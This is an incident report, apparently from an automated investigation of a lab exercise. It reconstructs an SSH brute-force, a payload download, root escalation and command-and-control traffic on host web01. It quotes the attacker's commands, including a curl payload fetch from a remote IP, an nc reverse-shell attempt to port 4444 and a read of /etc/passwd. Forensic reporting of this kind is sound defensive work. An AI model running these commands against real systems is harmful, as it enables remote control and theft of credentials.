# Incident Report — incident01

| Field | Value |
|---|---|
| Case ID | incident01 |
| Affected host | `web01` (internal IP `10.10.10.15`) |
| Incident date | 2026-08-15 (all timestamps UTC) |
| Report generated | 2026-08-15 |
| Analyst | CyberAgent (automated investigation) |
| Severity | **Critical** |
| Status | Confirmed compromise — active intrusion with privilege escalation to root |
| Verdict | **Malicious activity IS present** |

---

## 1. Executive Summary

On 2026-08-15, the internal host `web01` (`10.10.10.15`) was compromised by an external actor originating from `185.199.110.47`. The attacker performed web reconnaissance, brute-forced SSH credentials, and successfully authenticated as the `deploy` service account at 09:41:31Z. Within ~6 minutes they executed host discovery, downloaded a payload (`/tmp/.cache_update`) from a known-suspicious IP, escalated to **root**, established command-and-control (C2) channels over HTTPS, and attempted a reverse shell via `nc` to `192.0.2.55:4444`, which was blocked by the firewall.

All six indicators in the internal threat-intel dataset are corroborated by at least one evidence log. The incident is assessed as a **confirmed, successful intrusion** with root-level access achieved on the affected host.

---

## 2. Scope & Evidence Sources

Investigation used only project-local evidence (per README rules). No files were modified and no destructive commands were executed.

| Source | Path | Role in analysis |
|---|---|---|
| Auth log | `cases/incident01/evidence/auth.log` | SSH brute-force, credential compromise, sudo usage |
| Web log | `cases/incident01/evidence/web.log` | Attacker web reconnaissance / enumeration |
| Process log | `cases/incident01/evidence/process.log` | Post-exploitation commands, payload execution, reverse shell |
| DNS log | `cases/incident01/evidence/dns.log` | C2/staging domain resolution to suspicious IPs |
| Firewall log | `cases/incident01/evidence/firewall.log` | Inbound/outbound connection allow/deny decisions |
| Threat intel | `threat_intel/indicators.txt` | Known-suspicious IoCs for correlation |

---

## 3. Conclusion & Confidence

**Verdict:** Confirmed malicious intrusion of `web01`.

**Confidence: High.** The conclusion is supported by a complete, internally consistent kill-chain spanning five independent log sources, and every threat-intel indicator is independently matched in the evidence (see §6). There is no benign explanation that accounts for root-level execution of `/tmp/.cache_update --connect` followed by an `nc` reverse-shell attempt.

---

## 4. Correlated Timeline (2026-08-15, UTC)

| Time | Event | Source(s) | Phase |
|---|---|---|---|
| 09:36–09:39 | Normal internal web activity from `10.10.10.15` (baseline) | web.log | — |
| 09:40:51 | Attacker `185.199.110.47` requests `/` (200) | web.log | Reconnaissance |
| 09:40:54–09:41:02 | Enumeration of `/admin`, `/login`, `/wp-login.php`, `/phpmyadmin/` | web.log | Reconnaissance / enumeration |
| 09:40:58 | Firewall **ALLOW** TCP `185.199.110.47 → 10.10.10.15:22` | firewall.log | Initial access (SSH) |
| 09:41:02–09:41:24 | Repeated **failed** SSH logins for `admin`, `root` (×4), `deploy` (×2) from `185.199.110.47` | auth.log | Brute-force / credential attack |
| 09:41:31 | **Accepted password for `deploy`** from `185.199.110.47`; session opened | auth.log, firewall.log | Initial access — account compromise |
| 09:42:03–09:43:07 | `sudo id`, `sudo uname -a`, `sudo cat /etc/passwd` (as `deploy`) | auth.log, process.log | Discovery / host recon |
| 09:43:58–09:44:03 | DNS `updates.examplecdn.net → 203.0.113.77` | dns.log | C2/staging resolution |
| 09:43:45 | `python3 -c 'import socket'` (network capability check) | process.log | Pre-C2 preparation |
| 09:44:01 | `curl https://203.0.113.77/update` (payload download) | process.log, firewall.log | Payload retrieval |
| 09:44:16 | `chmod +x /tmp/.cache_update` | process.log | Staging malicious file |
| 09:44:25 | Execute `/tmp/.cache_update` as `deploy` | process.log | Execution |
| 09:44:51 | **`/tmp/.cache_update --connect` running as `root`** | process.log, firewall.log | Privilege escalation + C2 connect |
| 09:46:18–09:47:02 | DNS `cdn-assets.examplecdn.net → 198.51.100.24`; outbound :443 allowed | dns.log, firewall.log | C2 / data channel |
| 09:47:51 | DNS `unknown-service.example.net → 192.0.2.55` (C2 candidate) | dns.log | C2 resolution |
| 09:48:14–09:48:15 | **`nc 192.0.2.55 4444` as `root`** → firewall **DENY** (×2 at 09:48:15, 09:49:03) | process.log, firewall.log | Reverse-shell attempt (blocked) |
| 09:47:32 | SSH session closed for `deploy` | auth.log | Session end |

---

## 5. Attack Chain (MITRE ATT&CK-style mapping)

1. **Reconnaissance** — Web enumeration of admin/WordPress/phpMyAdmin endpoints from `185.199.110.47`. *(web.log)*
2. **Initial Access / Credential Compromise** — SSH brute-force; successful password login as `deploy` at 09:41:31Z. *(auth.log, firewall.log)*
3. **Discovery** — `id`, `uname -a`, `cat /etc/passwd`. *(process.log, auth.log)*
4. **Execution of Malicious Payload** — Download from `203.0.113.77/update` → `/tmp/.cache_update`; `chmod +x`; execute. *(process.log, dns.log, firewall.log)*
5. **Privilege Escalation** — `/tmp/.cache_update --connect` observed running as **root**. *(process.log)*
6. **Command & Control / Exfiltration** — Outbound HTTPS to `203.0.113.77:443` and `198.51.100.24:443`; C2 domain lookups. *(firewall.log, dns.log)*
7. **Reverse Shell (blocked)** — `nc 192.0.2.55 4444` as root; denied by firewall. *(process.log, firewall.log)*

---

## 6. Indicators of Compromise (IoCs) & Threat-Intel Correlation

Every indicator from `threat_intel/indicators.txt` is matched in the evidence:

| Indicator | Type | Intel label | Matched in evidence |
|---|---|---|---|
| `185.199.110.47` | Source IP | suspicious | auth.log (brute-force + login), web.log (recon), firewall.log (inbound :22) |
| `203.0.113.77` | Destination IP | suspicious | dns.log, process.log (`curl .../update`), firewall.log (:443 ALLOW) |
| `198.51.100.24` | Destination IP | suspicious | dns.log, firewall.log (:443 ALLOW) |
| `192.0.2.55` | Destination IP | suspicious | dns.log, process.log (`nc ... 4444`), firewall.log (:4444 DENY) |
| `/tmp/.cache_update` | Suspicious file | suspicious_file | process.log (chmod +x, execute, `--connect`) |
| `deploy` | Account | compromised_account_candidate | auth.log (successful login), process.log (all post-exploitation commands) |

**Additional derived IoCs:**
- Domains: `updates.examplecdn.net`, `cdn-assets.examplecdn.net`, `unknown-service.example.net`
- URL: `https://203.0.113.77/update`
- File path + behavior: `/tmp/.cache_update --connect` (root)
- Process signature: `nc 192.0.2.55 4444`

---

## 7. Impact Assessment

- **Account compromise:** `deploy` service account credentials exposed/used by attacker.
- **Privilege escalation:** Root-level execution confirmed on `web01`.
- **Malicious code execution:** `/tmp/.cache_update` executed with root privileges.
- **C2 established:** Outbound HTTPS channels to two known-suspicious IPs were allowed.
- **Reverse shell attempted:** One attempt blocked by firewall; treat host as fully compromised regardless.
- **Data exposure risk:** `cat /etc/passwd` and C2 data channel indicate potential credential/data exfiltration — scope of exfiltration is unknown from available evidence.

---

## 8. Recommended Actions

**Immediate (containment)**
1. Isolate `web01` (`10.10.10.15`) from the network; preserve memory/disk for forensics before reboot.
2. Disable/rotate credentials for the `deploy` account and any keys it can use; force org-wide review of shared service accounts.
3. Block egress to `203.0.113.77`, `198.51.100.24`, `192.0.2.55` at the perimeter (the last was already denied — verify policy).

**Eradication**
4. Remove `/tmp/.cache_update`; hunt for persistence (cron, systemd units, `.bashrc`, SSH authorized_keys, new local users) introduced after 09:41Z.
5. Rebuild `web01` from a known-good image rather than cleaning in place (root was compromised).

**Investigation / detection**
6. Search all hosts for the same IoCs (§6) to determine lateral movement or additional victims.
7. Review SSH access policy: disable password auth, enforce key-only + MFA, and rate-limit/fail2ban on port 22 (brute-force was effective).
8. Add detection rules for: execution of files from `/tmp`, `nc`/socket tooling as root, and outbound to the listed C2 IPs/domains.

**Prevention**
9. Restrict egress to an allow-list; block direct IP-based HTTPS (C2 used raw-IP URLs).
10. Enforce least privilege — `deploy` should not have passwordless/interactive sudo for arbitrary commands.

---

## 9. Methodology Notes

- Investigation followed the README procedure: read docs → identify evidence → inspect logs → correlate indicators → determine malicious activity → document evidence → report.
- Conclusions are drawn only from project-local evidence; no external lookups were performed and no evidence files were modified.
- The firewall **DENY** of `192.0.2.55:4444` is treated as a control that partially worked, but the prior root-level C2 connections (ALLOW) mean containment cannot be assumed — full compromise is the working assumption.

*End of report.*
